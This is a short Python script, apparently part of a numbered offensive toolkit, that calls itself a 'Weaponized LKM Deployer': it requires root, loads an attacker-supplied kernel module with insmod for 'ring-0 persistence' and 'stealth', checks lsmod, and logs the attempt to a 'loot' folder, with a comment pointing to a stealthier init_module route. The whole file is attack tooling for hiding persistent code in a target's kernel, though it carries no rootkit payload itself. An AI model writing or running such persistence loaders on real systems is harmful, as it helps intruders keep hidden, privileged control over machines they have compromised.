import os
import sys
import subprocess

def deploy_lkm(module_path):
    """
    Weaponized LKM Deployer: Interrogates the environment and 
    loads a kernel object (.ko) for ring-0 persistence.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Kernel module injection requires UID 0.")
        sys.exit(1)

    if not os.path.exists(module_path):
        print(f"[-] Module not found: {module_path}")
        return

    print(f"[*] Analyzing environment for module: {os.path.basename(module_path)}")
    
    # Check kernel version for compatibility
    kernel_version = os.uname().release
    print(f"[*] Target Kernel Release: {kernel_version}")

    try:
        # Primitive: Using insmod to push the module into kernel space
        # In a real engagement, we would use f_init_module via ctypes to be stealthier
        print(f"[*] Attempting Ring-0 Injection of {module_path}...")
        
        result = subprocess.run(["insmod", module_path], capture_output=True, text=True)
        
        if result.returncode == 0:
            print("[!!!] SUCCESS: Kernel Module Loaded. Stealth Established.")
            # Verify via lsmod
            check = subprocess.run(["lsmod"], capture_output=True, text=True)
            module_name = os.path.basename(module_path).split('.')[0]
            if module_name in check.stdout:
                print(f"[+] Verified: {module_name} is active in the symbol table.")
        else:
            print(f"[-] Injection Failed: {result.stderr.strip()}")
            
        # Log the deployment attempt
        with open("../loot/lkm_deployment.log", "a") as log:
            log.write(f"Module: {module_path} | Kernel: {kernel_version} | Status: {result.returncode}\n")

    except Exception as e:
        print(f"[-] Deployment Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 141_lkm_deployer <path_to_kernel_module.ko>")
        sys.exit(1)
    
    deploy_lkm(sys.argv[1])
